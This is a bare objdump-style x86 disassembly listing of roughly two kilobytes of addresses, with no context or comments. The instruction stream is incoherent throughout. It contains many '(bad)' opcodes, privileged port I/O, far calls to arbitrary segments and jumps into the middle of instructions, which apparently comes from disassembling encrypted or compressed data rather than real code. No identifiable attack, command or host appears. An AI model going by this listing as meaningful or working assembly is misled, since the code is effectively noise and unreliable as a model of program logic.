  4115e8:	shrd   DWORD PTR [esi+0x2f114890],ecx,0xd6
  4115f0:	jnp    0x41161f
  4115f2:	test   ch,dl
  4115f4:	sub    al,0x13
  4115f6:	mov    dh,0xb4
  4115f8:	pop    es
  4115f9:	dec    esp
  4115fa:	imul   edi,DWORD PTR [eax+0x61],0x67
  4115fe:	cli    
  4115ff:	inc    esp
  411600:	pop    es
  411601:	and    eax,0x2fdbe398
  411606:	mov    bh,0x52
  411608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411609:	or     edx,DWORD PTR [eax-0x38]
  41160c:	ja     0x411615
  41160e:	test   eax,0x74e26bd0
  411613:	inc    ebx
  411614:	xor    esi,edx
  411616:	clc    
  411617:	es fild DWORD PTR ds:[bp+si]
  41161c:	lods   eax,DWORD PTR ds:[esi]
  41161d:	loopne 0x41161d
  41161f:	sub    ecx,DWORD PTR [ebp-0x42df6c42]
  411625:	fsubr  st,st(3)
  411627:	push   0x62
  411629:	dec    edi
  41162a:	mov    ebp,0x1379330
  41162f:	test   eax,esi
  411631:	mov    bl,0x1a
  411633:	pop    esi
  411634:	pop    esi
  411635:	cmp    ch,BYTE PTR [ecx-0x5224e6f]
  41163b:	jb     0x4116b9
  41163d:	les    ebx,FWORD PTR [edi]
  41163f:	loope  0x411621
  411641:	dec    esi
  411642:	ret    0xf52d
  411645:	mov    al,ds:0x3d35002a
  41164a:	pop    es
  41164b:	arpl   WORD PTR [ebx],ax
  41164d:	cmp    DWORD PTR [ebx],edx
  41164f:	out    dx,al
  411650:	mov    dl,0x5e
  411652:	push   esi
  411653:	popa   
  411654:	adc    al,al
  411656:	lea    ebp,[ebx+0x10]
  411659:	add    esp,DWORD PTR [edi]
  41165b:	push   ds
  41165c:	cli    
  41165d:	pushf  
  41165e:	pop    ds
  41165f:	and    dh,0x98
  411662:	inc    edi
  411663:	mov    al,0xaf
  411665:	inc    eax
  411666:	shl    BYTE PTR [ebx-0x5c31e05b],0x2a
  41166d:	daa    
  41166e:	pop    ebp
  41166f:	dec    ebx
  411670:	dec    esp
  411671:	mov    ebx,0xcf8f1c72
  411676:	mov    cl,0xa7
  411678:	xor    eax,0xcd663ae2
  41167d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41167e:	mov    ebp,0x893036e8
  411683:	sbb    DWORD PTR [esi+eax*2-0x55da478f],esp
  41168a:	cmp    esi,DWORD PTR [edx+0x62]
  41168d:	enter  0x3f48,0xa7
  411691:	les    ecx,FWORD PTR [bx+si]
  411694:	addr16 cdq 
  411696:	mov    eax,0x70b85eeb
  41169b:	(bad)  
  41169c:	pop    es
  41169d:	test   al,0xc7
  41169f:	push   ebp
  4116a0:	dec    esp
  4116a1:	push   esp
  4116a2:	(bad)  
  4116a3:	push   edi
  4116a4:	setle  BYTE PTR [edx-0x185dd0d7]
  4116ab:	push   eax
  4116ac:	enter  0x4b18,0xbb
  4116b0:	or     ah,BYTE PTR [esi-0x67f15233]
  4116b6:	ret    
  4116b7:	test   DWORD PTR [edx+ecx*4+0x19],0x93ff7e77
  4116bf:	jne    0x41172b
  4116c1:	jb     0x411739
  4116c3:	add    ebp,edx
  4116c5:	leave  
  4116c6:	xor    DWORD PTR [ecx+0xc1552e5],eax
  4116cc:	cmp    al,0xcc
  4116ce:	adc    BYTE PTR [edx],0x7a
  4116d1:	inc    edi
  4116d2:	mov    edx,0x9371d8cc
  4116d7:	xor    esi,ebp
  4116d9:	test   BYTE PTR ds:0x650e4bfa,ch
  4116df:	cmc    
  4116e0:	call   0xe736:0xf3d8cd23
  4116e7:	xchg   esi,eax
  4116e8:	xor    BYTE PTR [ecx-0x641c402],dl
  4116ee:	add    al,0x3a
  4116f0:	lahf   
  4116f1:	or     al,0x87
  4116f3:	push   ss
  4116f4:	lock (bad) 
  4116f6:	sub    esp,DWORD PTR [ebp+0x746c8fa7]
  4116fc:	cmc    
  4116fd:	adc    al,0x1c
  411700:	xor    eax,0x39f6d3c2
  411705:	jb     0x4116a3
  411707:	rol    DWORD PTR [edx-0x46],0x18
  41170b:	ror    DWORD PTR [edx-0x4d1c0eed],0x76
  411712:	mov    ebx,0x44405131
  411717:	jns    0x41178f
  411719:	repz aas 
  41171b:	add    ebx,DWORD PTR [ebx+0x1b]
  41171e:	inc    ebp
  41171f:	xor    edx,DWORD PTR [edx]
  411721:	inc    esi
  411722:	repnz xchg edx,eax
  411724:	jge    0x4116e2
  411726:	xchg   BYTE PTR [edx],ah
  411728:	mov    dh,0x67
  41172a:	imul   eax,DWORD PTR [edi-0xcef2192],0xf5fcfbb4
  411734:	xchg   edx,eax
  411735:	adc    DWORD PTR [edi+0x345dab60],edx
  41173b:	push   ebp
  41173c:	and    ecx,edx
  41173e:	push   es
  41173f:	lahf   
  411740:	push   ds
  411741:	and    BYTE PTR [ecx+eiz*2+0x5b8e1e44],ah
  411748:	pop    ds
  411749:	mul    dh
  41174b:	cmp    DWORD PTR [edx+0x3d511465],esp
  411751:	add    BYTE PTR [ecx-0x1],0x42
  411755:	sub    DWORD PTR [edx+0x3170fd3a],esi
  41175b:	xchg   DWORD PTR [ebp+0x3ea10365],ecx
  411761:	fistp  DWORD PTR ds:0x72f4399e
  411767:	push   cs
  411768:	call   0x9797:0x8f7ab34d
  41176f:	cdq    
  411770:	mov    esi,0x5960002c
  411775:	adc    BYTE PTR ss:[esi+0xb7742e4],bh
  41177c:	inc    edx
  41177d:	pop    edx
  41177e:	inc    ecx
  41177f:	call   0x8894689e
  411784:	and    al,0xd0
  411786:	in     eax,0x23
  411788:	xchg   edx,eax
  411789:	bound  edi,QWORD PTR [edi+0x60]
  41178c:	mov    ah,0x20
  41178e:	clc    
  41178f:	cmp    ebx,DWORD PTR [esi]
  411791:	(bad)  
  411792:	mov    bl,0xce
  411794:	enter  0x2f5f,0x82
  411798:	and    BYTE PTR [eax+0xd],ch
  41179b:	pop    edx
  41179c:	dec    ecx
  41179d:	pop    esp
  41179e:	(bad)  
  41179f:	mov    edi,0x8346fd32
  4117a4:	cmp    al,0xca
  4117a6:	xor    ebp,edx
  4117a8:	scas   al,BYTE PTR es:[edi]
  4117a9:	mov    ebx,esi
  4117ab:	push   esi
  4117ac:	gs cli 
  4117ae:	or     eax,0xc52ec40b
  4117b3:	adc    eax,edi
  4117b5:	jge    0x4117f6
  4117b7:	call   0x5fc0:0x7cf9b1ba
  4117be:	leave  
  4117bf:	dec    eax
  4117c0:	ss xchg edx,eax
  4117c2:	loope  0x4117cb
  4117c4:	xchg   edx,eax
  4117c5:	jae    0x4117bb
  4117c7:	push   esi
  4117c8:	ret    0xa908
  4117cb:	sub    ah,dh
  4117cd:	sub    ebp,0x79
  4117d0:	inc    edx
  4117d1:	(bad)  
  4117d3:	aas    
  4117d4:	jne    0x411820
  4117d6:	pop    ecx
  4117d7:	dec    edx
  4117d8:	and    DWORD PTR [ecx-0x76],ebx
  4117db:	std    
  4117dc:	inc    esp
  4117dd:	mov    edx,0x86bc6fb3
  4117e2:	les    ecx,FWORD PTR [edi]
  4117e4:	addr16 pop es
  4117e6:	lods   al,BYTE PTR ds:[esi]
  4117e7:	add    eax,0x24c3620d
  4117ec:	cmp    eax,0xbb5af60
  4117f1:	jp     0x411773
  4117f3:	cmp    ebp,DWORD PTR ds:0x21919dd
  4117f9:	loopne 0x41181f
  4117fb:	cmp    eax,0xeea820f4
  411800:	mov    esp,0x9fd5459b
  411805:	jno    0x4117f2
  411807:	dec    esp
  411808:	or     BYTE PTR [esi+0x1f27206a],ah
  41180e:	dec    eax
  41180f:	sbb    ebx,DWORD PTR [ecx]
  411811:	ins    BYTE PTR es:[edi],dx
  411812:	mov    ds:0x3d4f1d38,eax
  411817:	gs mov al,dh
  41181a:	shr    BYTE PTR [ebx+0x38],1
  41181d:	push   edi
  41181e:	jnp    0x4117cc
  411820:	xor    esi,DWORD PTR [esp+edx*8-0x76170b0]
  411827:	pop    es
  411828:	out    dx,eax
  411829:	fscale 
  41182b:	gs sub al,0xcc
  41182e:	xchg   edi,eax
  41182f:	inc    edx
  411830:	sbb    al,0x44
  411832:	mov    al,0x2d
  411834:	xor    DWORD PTR [ebp+0x4c],edx
  411837:	pusha  
  411838:	xchg   DWORD PTR [ebp+0x12],edx
  41183b:	and    edx,DWORD PTR [eax]
  41183d:	push   0x65
  41183f:	arpl   WORD PTR [eax],ax
  411841:	inc    esp
  411842:	mov    edi,0xd23341ad
  411847:	sbb    cl,dl
  411849:	mov    al,0xe2
  41184b:	sub    eax,0x49b0737f
  411850:	bound  edx,QWORD PTR ds:0xb2b07587
  411856:	imul   edi,DWORD PTR [esi+0x3878831c],0xaaf1c29d
  411860:	xchg   edx,eax
  411861:	mov    edi,DWORD PTR [eax]
  411863:	out    dx,al
  411864:	adc    bh,BYTE PTR [eax+edx*1+0x3cb3b1fc]
  41186b:	adc    al,0x65
  41186d:	dec    edx
  41186e:	in     eax,0x8
  411870:	neg    ah
  411872:	mov    fs,WORD PTR [eax+0x201e6438]
  411878:	cdq    
  411879:	inc    eax
  41187a:	cmp    eax,0x1711c57f
  41187f:	out    dx,eax
  411880:	push   ebp
  411881:	cs test al,0xaf
  411884:	out    dx,eax
  411885:	ret    
  411886:	sbb    dh,0xa
  411889:	mov    bl,0xf7
  41188b:	iret   
  41188c:	lds    ebx,FWORD PTR [edx]
  41188e:	(bad)  
  411890:	aad    0xff
  411892:	fcom   DWORD PTR [ebx+0x11]
  411895:	pusha  
  411896:	loop   0x4118ce
  411898:	rcl    dh,cl
  41189a:	test   eax,0xb6e3a56d
  41189f:	xchg   esp,eax
  4118a0:	cmp    edx,DWORD PTR [edx-0x7d64f94a]
  4118a6:	xor    BYTE PTR [ebp-0x4d0373ed],al
  4118ac:	dec    ebp
  4118ad:	pusha  
  4118ae:	sbb    DWORD PTR [ebx],ecx
  4118b0:	xor    BYTE PTR [ebp+edi*2-0x78],ah
  4118b4:	sub    edi,0x1805b8aa
  4118ba:	mov    ecx,0xd3804a0c
  4118bf:	add    DWORD PTR [ecx-0xddcc0fd],esi
  4118c5:	fidiv  DWORD PTR [edx]
  4118c7:	adc    cl,BYTE PTR [esi-0x45]
  4118ca:	push   ebp
  4118cb:	dec    esp
  4118cc:	ret    0xb08f
  4118cf:	adc    esi,DWORD PTR [edi+0x4a6827c6]
  4118d5:	pusha  
  4118d6:	xchg   ebx,eax
  4118d7:	xchg   ecx,eax
  4118d8:	xchg   edx,eax
  4118d9:	xor    DWORD PTR [ebp-0x6c7de180],edx
  4118df:	mov    esi,DWORD PTR [ecx+0x26]
  4118e2:	stos   BYTE PTR es:[edi],al
  4118e3:	pusha  
  4118e4:	mov    ds:0x5b1cbf99,al
  4118e9:	out    0xc3,al
  4118eb:	test   al,0xf2
  4118ed:	je     0x4118b9
  4118ef:	mul    BYTE PTR ds:0x644b7562
  4118f5:	or     eax,0x94a6685a
  4118fa:	and    BYTE PTR [ecx+0x5715081a],dl
  411900:	mov    al,0x6b
  411902:	xchg   edx,eax
  411903:	sar    ch,0x15
  411906:	ror    DWORD PTR [esi],1
  411908:	or     dl,BYTE PTR [edx-0x58]
  41190b:	mov    eax,ds:0x694db305
  411910:	inc    esi
  411911:	ss popa 
  411913:	and    eax,0x50a563fb
  411918:	mov    ds:0xe843a304,eax
  41191d:	push   edi
  41191e:	mov    bh,0x72
  411920:	xlat   BYTE PTR ds:[ebx]
  411921:	and    DWORD PTR [ecx+0x50ccb786],esi
  411927:	jmp    0x41192a
  411929:	jecxz  0x4118c4
  41192b:	mov    WORD PTR [ebx-0x2e055089],es
  411931:	lahf   
  411932:	out    0x27,al
  411934:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411935:	inc    edx
  411936:	mov    esi,0xda40574e
  41193b:	mov    dl,BYTE PTR [edi+eax*1]
  41193e:	(bad)  
  41193f:	cmp    al,0xc7
  411941:	call   0x851fcd70
  411946:	mov    cl,0xdd
  411948:	test   dl,ah
  41194a:	bound  esi,QWORD PTR [edx-0x67ed8e4e]
  411950:	push   0x22406ee7
  411955:	call   0x149a21b5
  41195a:	jmp    0x41199c
  41195c:	jle    0x4118f0
  41195e:	mov    ebx,DWORD PTR [ebp-0x52]
  411961:	into   
  411962:	pusha  
  411963:	addr16 dec esi
  411965:	sub    eax,0xdda12065
  41196a:	cmp    edi,DWORD PTR [ebx-0x5f4b9a28]
  411970:	test   BYTE PTR [edx],al
  411972:	adc    BYTE PTR ds:0xe89aa1d6,ch
  411978:	jp     0x41194b
  41197a:	imul   ebx,DWORD PTR [edx+ebx*4],0xb
  41197e:	nop
  41197f:	mov    ebx,0x46aebecc
  411984:	push   esi
  411985:	xor    bl,BYTE PTR [edi+ebp*1]
  411988:	dec    edx
  411989:	push   0x4da6a4ac
  41198e:	xchg   esp,eax
  41198f:	popf   
  411990:	test   BYTE PTR [esi+0x5446fa8f],0x1e
  411997:	sbb    bl,bh
  411999:	xor    edx,esp
  41199b:	lds    esi,FWORD PTR [esi]
  41199d:	dec    edi
  41199e:	cwde   
  41199f:	pop    eax
  4119a0:	loopne 0x4119a4
  4119a2:	sbb    bl,bl
  4119a4:	xlat   BYTE PTR ds:[ebx]
  4119a5:	aaa    
  4119a6:	sub    DWORD PTR [ebx+0x352554a9],edx
  4119ac:	scas   eax,DWORD PTR es:[edi]
  4119ad:	pusha  
  4119ae:	in     eax,0x22
  4119b0:	ret    
  4119b1:	mov    esi,0x577e6684
  4119b6:	xchg   edx,eax
  4119b7:	add    eax,ebp
  4119b9:	jae    0x41195c
  4119bb:	cmp    DWORD PTR [edi-0x32],eax
  4119be:	pushf  
  4119bf:	adc    edx,DWORD PTR [ecx]
  4119c1:	cwde   
  4119c2:	cmp    DWORD PTR [eax],0xd48a67f2
  4119c8:	arpl   WORD PTR [edx],cx
  4119ca:	mov    ss:0xf23765d3,al
  4119d0:	mov    DWORD PTR [esi-0x524379d],edx
  4119d6:	loope  0x4119bb
  4119d8:	mov    ebp,0xbc9f1274
  4119dd:	adc    ebx,DWORD PTR [ecx]
  4119df:	mov    bh,0xbe
  4119e1:	test   cl,ah
  4119e3:	cdq    
  4119e4:	xchg   ebp,eax
  4119e5:	push   edi
  4119e6:	and    DWORD PTR ds:0xd8831bcd,edi
  4119ec:	idiv   DWORD PTR [eax]
  4119ee:	jl     0x411a3b
  4119f0:	cmp    BYTE PTR [esp+ebp*2+0x3b],bl
  4119f4:	push   esi
  4119f5:	jg     0x4119a1
  4119f7:	rol    BYTE PTR [eax],cl
  4119f9:	pop    ss
  4119fa:	repnz pop eax
  4119fc:	fsubr  st(6),st
  4119fe:	loop   0x4119ae
  411a00:	test   al,dh
  411a02:	add    al,0x96
  411a04:	lds    esi,FWORD PTR fs:[edx+ebx*8]
  411a08:	mov    ds:0x1da755e8,al
  411a0d:	scas   eax,DWORD PTR es:[edi]
  411a0e:	ins    BYTE PTR es:[edi],dx
  411a0f:	dec    edi
  411a10:	mov    edx,edx
  411a12:	pop    ecx
  411a13:	adc    al,0xbc
  411a15:	sbb    BYTE PTR fs:[ecx+0x25],ch
  411a19:	mov    DWORD PTR [esi-0x71c97300],ecx
  411a1f:	lods   al,BYTE PTR ds:[esi]
  411a20:	or     BYTE PTR [edx-0x3fb764a5],dl
  411a26:	imul   esi,DWORD PTR [eax+0x59],0x15
  411a2a:	cld    
  411a2b:	jecxz  0x411a5a
  411a2d:	or     al,0xad
  411a2f:	nop
  411a30:	dec    dl
  411a32:	mov    ah,0xd6
  411a34:	fadd   DWORD PTR [edx+0x4d0ca11c]
  411a3a:	xor    bx,bp
  411a3d:	in     al,0xc5
  411a3f:	xchg   BYTE PTR [eax],ah
  411a41:	jmp    0xd682b7ea
  411a46:	loop   0x411a42
  411a48:	jmp    0x411a68
  411a4a:	clc    
  411a4b:	stc    
  411a4c:	xchg   esp,eax
  411a4d:	add    al,0xae
  411a4f:	pop    esi
  411a50:	sar    DWORD PTR [edx+0x23],0xee
  411a54:	cmc    
  411a55:	gs push edx
  411a57:	js     0x411a7a
  411a59:	push   ecx
  411a5a:	mov    ebx,0x96a9fe04
  411a5f:	lods   al,BYTE PTR ds:[esi]
  411a60:	ins    BYTE PTR es:[edi],dx
  411a61:	fmulp  st(4),st
  411a63:	cld    
  411a64:	ins    DWORD PTR es:[edi],dx
  411a65:	mov    bl,0xd5
  411a67:	out    dx,al
  411a68:	push   ebp
  411a69:	cwde   
  411a6a:	sub    ah,cl
  411a6c:	push   ss
  411a6d:	mov    ds:0x79438b52,al
  411a72:	lea    ebp,ds:0x677ec950
  411a78:	push   ecx
  411a79:	jne    0x411a8b
  411a7b:	test   al,0x32
  411a7d:	mov    ebp,0xf53c8bb4
  411a82:	push   ebp
  411a83:	inc    esi
  411a84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a85:	push   esi
  411a86:	add    dh,ch
  411a88:	dec    esi
  411a89:	add    eax,0x21107905
  411a8e:	loopne 0x411aea
  411a90:	push   esi
  411a91:	adc    DWORD PTR [eax-0x5e22a96f],edx
  411a97:	jmp    0x3491:0xab0385d3
  411a9e:	ds inc ebp
  411aa0:	inc    esi
  411aa1:	add    al,0x5a
  411aa3:	cli    
  411aa4:	fld    TBYTE PTR [eax+0x1267a1c4]
  411aaa:	fadd   st(5),st
  411aac:	pop    ebp
  411aad:	or     ch,BYTE PTR [ebx+edi*1-0x661e84a3]
  411ab4:	jmp    0x411aec
  411ab6:	ja     0x411ac2
  411ab8:	sbb    edx,0x70
  411abb:	mov    bh,0x18
  411abd:	fbld   TBYTE PTR [ebp+esi*1-0x29e4af58]
  411ac4:	push   ss
  411ac5:	rcl    DWORD PTR [ecx+0x40],0xd5
  411ac9:	xchg   edi,eax
  411aca:	scas   eax,DWORD PTR es:[edi]
  411acb:	and    DWORD PTR [esi],ecx
  411acd:	sar    BYTE PTR [esi-0x72],cl
  411ad0:	jb     0x411a94
  411ad2:	repnz out dx,al
  411ad4:	adc    BYTE PTR [esi+0x35],0xdc
  411ad8:	call   0x965c:0x4e0f72fe
  411adf:	push   edi
  411ae0:	mov    al,ds:0xd303f1a3
  411ae5:	cli    
  411ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ae7:	fcom   QWORD PTR [ecx]
  411ae9:	mov    ecx,0xbece6c56
  411aee:	jo     0x411b3a
  411af0:	out    0xa5,al
  411af2:	outs   dx,BYTE PTR ds:[esi]
  411af3:	adc    ah,BYTE PTR [ebx+0x498d07c2]
  411af9:	or     ecx,esp
  411afb:	jmp    DWORD PTR [ecx+0x76698ff6]
  411b01:	inc    DWORD PTR [ebp+0x5719499b]
  411b07:	mov    ecx,0x20022292
  411b0c:	cld    
  411b0d:	dec    ebx
  411b0e:	sub    al,0x3
  411b10:	cmp    edx,ecx
  411b12:	(bad)  
  411b13:	dec    esi
  411b14:	ja     0x411adf
  411b16:	jmp    0x411b33
  411b18:	fxch   st(1)
  411b1a:	fdivr  QWORD PTR [ebx]
  411b1c:	cmc    
  411b1d:	repnz and dh,bl
  411b20:	in     eax,dx
  411b21:	jns    0x411b13
  411b23:	sbb    bl,BYTE PTR [edi]
  411b25:	in     eax,dx
  411b26:	test   eax,0x6bef77c7
  411b2b:	bound  esp,QWORD PTR [ebx]
  411b2d:	dec    eax
  411b2e:	out    dx,eax
  411b2f:	test   BYTE PTR [ebx+eax*8+0x1f],cl
  411b33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b34:	push   ebx
  411b35:	or     bl,bl
  411b37:	cmc    
  411b38:	and    DWORD PTR [esp-0x28d8e17c],eax
  411b3f:	ret    0x36e7
  411b42:	sbb    DWORD PTR [edx],ecx
  411b44:	(bad)  
  411b45:	pop    ebx
  411b46:	mov    edx,0x5648891a
  411b4b:	push   0xffffff89
  411b4d:	hlt    
  411b4e:	shl    DWORD PTR [esi+0x550a92c1],0x51
  411b55:	mov    ds:0x28b998a5,eax
  411b5a:	in     al,0x3
  411b5c:	out    0x66,al
  411b5e:	add    DWORD PTR [edx+edx*1],0xf1c8c2cd
  411b65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b67:	jne    0x411bd9
  411b69:	mov    ebx,0xd531f907
  411b6e:	mov    ebx,0x73d52b75
  411b73:	ins    BYTE PTR es:[edi],dx
  411b74:	into   
  411b75:	jecxz  0x411b7d
  411b77:	pop    esp
  411b78:	fld    st(0)
  411b7a:	or     DWORD PTR gs:[edi],0x42
  411b7e:	push   0x8e464bb8
  411b83:	aaa    
  411b84:	addr16 push edx
  411b86:	xor    BYTE PTR [ebp+edi*8-0x5a],cl
  411b8a:	lea    eax,[esp+eax*1]
  411b8d:	xchg   edi,eax
  411b8e:	xor    bh,BYTE PTR [eax-0x407a2a59]
  411b94:	push   0xffffffc1
  411b96:	ret    0xb1af
  411b99:	sbb    cl,BYTE PTR [edi]
  411b9b:	out    0xe8,eax
  411b9d:	sub    ah,cl
  411b9f:	leave  
  411ba0:	repz mov eax,ds:0x1fbf8be3
  411ba6:	ins    BYTE PTR es:[edi],dx
  411ba7:	stos   DWORD PTR es:[edi],eax
  411ba8:	loopne 0x411c20
  411baa:	mov    ebp,0x8c97a8b2
  411baf:	xchg   ah,ch
  411bb1:	or     eax,0xafc39f13
  411bb6:	into   
  411bb7:	xchg   ebp,eax
  411bb8:	add    BYTE PTR [edx],ch
  411bba:	ins    BYTE PTR es:[edi],dx
  411bbb:	xchg   edi,eax
  411bbc:	fidivr DWORD PTR [ebx-0x6b]
  411bbf:	sbb    BYTE PTR [eax],cl
  411bc1:	(bad)  
  411bc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bc3:	fsub   QWORD PTR [ecx-0x34921b4a]
  411bc9:	popf   
  411bca:	jecxz  0x411bec
  411bcc:	mul    DWORD PTR [edx-0x10]
  411bcf:	mov    ebp,0x8df4cc24
  411bd4:	sbb    dl,BYTE PTR [edi-0x566dba0c]
  411bda:	mov    edx,0xe89b3d4d
  411bdf:	jmp    0x411bba
  411be1:	pushf  
  411be2:	test   al,0xa7
  411be4:	std    
  411be5:	jne    0x411b92
  411be7:	bound  edi,QWORD PTR fs:[edx+0x6b]
  411beb:	xor    eax,0x7d4995a2
  411bf0:	mov    edx,edx
  411bf2:	ins    DWORD PTR es:[edi],dx
  411bf3:	or     eax,0x6ac0dea2
  411bf8:	or     DWORD PTR [eax+0x16],edx
  411bfb:	or     ebx,edi
  411bfd:	add    dl,bl
  411bff:	jg     0x411bb8
  411c01:	gs push ds
  411c03:	test   DWORD PTR [eax+ebx*4],edi
  411c06:	xor    BYTE PTR [edx],ch
  411c08:	mov    al,0x19
  411c0a:	add    eax,0xb0ecd402
  411c0f:	aad    0x21
  411c11:	dec    ecx
  411c12:	dec    esi
  411c13:	sub    DWORD PTR [ebx],ecx
  411c15:	xchg   ebx,eax
  411c16:	push   ebp
  411c17:	outs   dx,BYTE PTR ds:[esi]
  411c18:	fdivp  st(4),st
  411c1a:	xchg   esp,eax
  411c1b:	jno    0x411c16
  411c1d:	icebp  
  411c1e:	dec    ebp
  411c1f:	mov    edx,0xc38b427a
  411c24:	adc    al,0x85
  411c26:	xlat   BYTE PTR ds:[ebx]
  411c27:	test   al,0x4c
  411c29:	mov    al,0x6a
  411c2b:	inc    eax
  411c2c:	cld    
  411c2d:	iret   
  411c2e:	add    eax,0xdef79b27
  411c33:	xchg   ebp,eax
  411c34:	mov    ecx,0xb7271201
  411c39:	lds    edx,FWORD PTR [edx+esi*4+0x64]
  411c3d:	xlat   BYTE PTR ds:[ebx]
  411c3e:	pop    edi
  411c3f:	jp     0x411c76
  411c41:	adc    bh,ah
  411c43:	(bad)  
  411c44:	mov    BYTE PTR [edi-0x35da47e],bh
  411c4a:	or     BYTE PTR [eax+0x39],dh
  411c4d:	shl    BYTE PTR [ebp+0x1c],cl
  411c50:	jmp    0x15b95daf
  411c55:	mov    al,0x4
  411c57:	out    0xf9,eax
  411c59:	retf   0x20c9
  411c5c:	ret    0xd50d
  411c5f:	test   al,0x2c
  411c61:	stos   BYTE PTR es:[edi],al
  411c62:	sbb    BYTE PTR [ebp+0x1f],ah
  411c65:	inc    esp
  411c66:	add    eax,0xbdd3f296
  411c6b:	xlat   BYTE PTR ds:[ebx]
  411c6c:	faddp  st(6),st
  411c6e:	and    al,0xf9
  411c70:	add    bl,BYTE PTR [ebx]
  411c72:	nop    DWORD PTR [edi]
  411c75:	les    ebx,FWORD PTR [ecx]
  411c77:	int    0xbc
  411c79:	jnp    0x411ce3
  411c7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c7c:	ins    DWORD PTR es:[edi],dx
  411c7d:	jne    0x411cd5
  411c7f:	test   eax,0x6ad02e38
  411c84:	scas   eax,DWORD PTR es:[edi]
  411c85:	lods   al,BYTE PTR ds:[esi]
  411c86:	sbb    ebx,esi
  411c88:	int3   
  411c89:	(bad)  
  411c8a:	sbb    DWORD PTR [esi],ecx
  411c8c:	inc    edi
  411c8d:	repz pop ds
  411c8f:	push   0xf242145
  411c94:	cdq    
  411c95:	ins    DWORD PTR es:[edi],dx
  411c96:	sbb    ah,BYTE PTR [edx]
  411c98:	push   edx
  411c99:	sbb    BYTE PTR [edi+edx*1+0x77fe0016],ch
  411ca0:	(bad)  
  411ca1:	cmp    bl,BYTE PTR cs:[eax]
  411ca4:	out    dx,eax
  411ca5:	aas    
  411ca6:	push   edi
  411ca7:	add    dh,BYTE PTR [edi+0x55]
  411caa:	test   eax,0xe0ce28b1
  411caf:	jge    0x411d09
  411cb1:	mov    dh,0x70
  411cb3:	mov    ds:0xeb4c1ed8,eax
  411cb8:	inc    esp
  411cb9:	mov    ecx,0x47d17a94
  411cbe:	mov    dh,dl
  411cc0:	push   es
  411cc1:	mov    edi,0xdce1a567
  411cc6:	mov    DWORD PTR [edi+0x6],ebp
  411cc9:	or     DWORD PTR [esi],ecx
  411ccb:	push   0xa3509906
  411cd0:	fnstcw WORD PTR [ebx+0x2675cd24]
  411cd6:	lahf   
  411cd7:	jmp    0x9b93:0xfa6fc3fe
  411cde:	shl    DWORD PTR [edx+0x4ef03fbc],0x2
  411ce5:	ret    0x76af
  411ce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ce9:	xlat   BYTE PTR ds:[ebx]
  411cea:	cmp    dl,BYTE PTR [ecx]
  411cec:	(bad)  
  411ced:	in     eax,dx
  411cee:	mov    ebp,0x21d67d57
  411cf3:	(bad)  
  411cf4:	cmp    DWORD PTR [ecx],eax
  411cf6:	and    al,0x9f
  411cf8:	leave  
  411cf9:	dec    ecx
  411cfa:	push   ds
  411cfb:	inc    esi
  411cfc:	jo     0x411d23
  411cfe:	jg     0x411d20
  411d00:	jb     0x411c9f
  411d02:	imul   ebp,DWORD PTR [eax-0x49],0x25
  411d06:	xor    BYTE PTR [edx+0x84a68e8],dl
  411d0c:	call   0x3de8:0x465f1629
  411d13:	outs   dx,BYTE PTR ds:[esi]
  411d14:	jo     0x411d23
  411d16:	fmul   DWORD PTR [edx-0x1]
  411d19:	inc    esp
  411d1a:	iret   
  411d1b:	jg     0x411cd8
  411d1d:	sbb    ch,BYTE PTR [edx+0x6ff220df]
  411d23:	and    DWORD PTR [eax+ebp*2+0x1c],0x24c52ba6
  411d2b:	xor    dh,bh
  411d2d:	clc    
  411d2e:	popf   
  411d2f:	sub    eax,0xd4c2d31c
  411d34:	inc    esi
  411d35:	dec    esp
  411d36:	inc    ebx
  411d37:	sar    eax,1
  411d39:	mov    ds:0xb34c57d3,eax
  411d3e:	xor    esp,DWORD PTR [eax]
  411d40:	inc    edx
  411d41:	jecxz  0x411da4
  411d43:	mov    cs,WORD PTR [edi+0x5f8c3533]
  411d49:	call   0xd2d0c9ad
  411d4e:	test   eax,0xfaa0b69d
  411d53:	outs   dx,DWORD PTR ds:[esi]
  411d54:	xchg   BYTE PTR ds:0xe220014a,bl
  411d5a:	es push es
  411d5c:	cmp    DWORD PTR [ecx-0x6b],0x36d584da
  411d63:	mov    ah,0x75
  411d65:	inc    eax
  411d66:	leave  
  411d67:	mov    cl,0x7f
  411d69:	pop    ebx
  411d6a:	or     al,0x8c
  411d6c:	jno    0x411d12
  411d6e:	xor    al,0x43
  411d70:	aas    
  411d71:	icebp  
  411d72:	aas    
  411d73:	cwde   
  411d74:	pop    ebp
  411d75:	in     al,dx
  411d76:	jmp    0x411d69
  411d78:	xchg   BYTE PTR [ebp-0x2c],bh
  411d7b:	inc    ecx
  411d7c:	pop    edx
  411d7d:	(bad)  
  411d7e:	xchg   esi,eax
  411d7f:	shr    DWORD PTR [ebx+0x3634acdb],1
  411d85:	and    eax,DWORD PTR [eax+0x30e4f2d6]
  411d8b:	jp     0x411d85
  411d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d8e:	xchg   edi,eax
  411d8f:	push   edx
  411d90:	push   0x53
  411d92:	mov    BYTE PTR [ebx+edi*1],al
  411d95:	pusha  
  411d96:	mov    bl,0xb0
  411d98:	ss dec edi
  411d9a:	dec    esi
  411d9b:	nop
  411d9c:	pop    ecx
  411d9d:	push   ss
  411d9e:	outs   dx,BYTE PTR ds:[esi]
  411d9f:	xchg   edx,eax
  411da0:	push   es
  411da1:	or     ch,bh
  411da3:	in     al,dx
  411da4:	arpl   cx,ax
  411da6:	in     al,0xdb
  411da8:	jns    0x411dc7
  411daa:	pushf  
  411dab:	in     al,0x63
  411dad:	cmp    BYTE PTR [edx-0x4f04ce58],0xb8
  411db4:	add    DWORD PTR [edi+0x2fec5e47],0x60
  411dbb:	jmp    0x7ecb25f
  411dc0:	mov    bl,0x7c
  411dc2:	or     bl,0x17
  411dc5:	add    al,0xab
  411dc7:	dec    edx
